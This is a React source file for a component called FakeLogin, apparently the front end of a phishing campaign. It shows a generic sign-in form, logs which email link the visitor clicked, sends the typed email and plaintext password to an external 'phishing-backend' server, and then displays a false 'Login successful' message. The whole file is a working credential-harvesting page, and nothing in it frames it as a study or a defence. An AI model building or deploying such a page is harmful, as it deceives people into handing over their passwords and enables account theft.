import React, { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";


function FakeLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [sourceEmail, setSourceEmail] = useState("");

  const location = useLocation();
  

  // ✅ Extract `source` from query params
  useEffect(() => {
  const params = new URLSearchParams(location.search);
  const source = params.get("source");
  if (source) {
    setSourceEmail(source);
  }
}, [location]);


  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      await fetch("https://phishing-backend-3.onrender.com/api/fake-login", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    email,
    password,
    clickedFrom: sourceEmail || "Direct Access",
  }),
});


      setSubmitted(true);
    } catch (err) {
      console.error("❌ Submission failed:", err);
    }
  };

  if (submitted) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-100">
        <h2 className="text-xl font-semibold text-green-600">
          ✅ Login successful!
        </h2>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <form
        onSubmit={handleSubmit}
        className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md"
      >
        <h2 className="text-2xl font-bold mb-6 text-center">
          Sign in to your account
        </h2>
        <input
          type="email"
          placeholder="Email address"
          className="w-full mb-4 p-2 border rounded"
          required
          onChange={(e) => setEmail(e.target.value)}
        />
        <input
          type="password"
          placeholder="Password"
          className="w-full mb-6 p-2 border rounded"
          required
          onChange={(e) => setPassword(e.target.value)}
        />
        <button
          type="submit"
          className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700"
        >
          Sign In
        </button>
      </form>
    </div>
  );
}

export default FakeLogin;
